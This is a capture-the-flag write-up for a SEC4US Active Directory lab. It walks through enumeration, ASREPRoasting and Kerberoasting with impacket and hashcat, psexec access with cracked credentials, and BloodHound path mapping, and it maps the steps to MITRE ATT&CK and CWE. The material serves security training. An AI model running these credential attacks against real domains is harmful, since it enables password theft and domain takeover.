# Maq179: Active Directory

Writeup for the **Active Directory** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 179

---

## Overview

A basic Active Directory environment with common misconfigurations. The challenge introduces AD enumeration, credential attacks, and domain privilege escalation.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Look for: DNS (53), Kerberos (88), LDAP (389/636), SMB (445), RPC (135), WinRM (5985). Confirm it is a Domain Controller:

```bash
crackmapexec smb [TARGET_IP]
```

**LDAP enumeration:**

```bash
ldapsearch -x -H ldap://[TARGET_IP] -b "DC=[DOMAIN],DC=local" -s sub "(objectclass=user)"
```

**Enumerate users via RPC:**

```bash
rpcclient -U "" -N [TARGET_IP] -c "enumdomusers"
```

## Exploitation

**ASREPRoasting (no pre-auth required):**

```bash
impacket-GetNPUsers [DOMAIN]/ -dc-ip [TARGET_IP] -usersfile users.txt -format hashcat
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Kerberoasting (with valid creds):**

```bash
impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [TARGET_IP] -request
hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Pass-the-Hash or psexec with cracked credentials:**

```bash
impacket-psexec [DOMAIN]/[ADMIN]:[PASS]@[TARGET_IP]
```

## Privilege Escalation

Use BloodHound to map attack paths:

```bash
bloodhound-python -u [USER] -p [PASS] -d [DOMAIN] -dc [DC_HOSTNAME] -c All
```

Import into BloodHound and look for shortest paths to Domain Admin.

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 |
| Steal or Forge Kerberos Tickets: AS-REP Roasting | T1558.004 |
| Remote Services: SMB/Windows Admin Shares | T1021.002 |
| OS Credential Dumping: DCSync | T1003.006 |

### CWE

- **CWE-521:** Weak Password Requirements
- **CWE-284:** Improper Access Control

---

Active Directory is the backbone of enterprise identity, and its first lesson is always the same: one weak password in a forest of thousands is all it takes to topple the domain.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
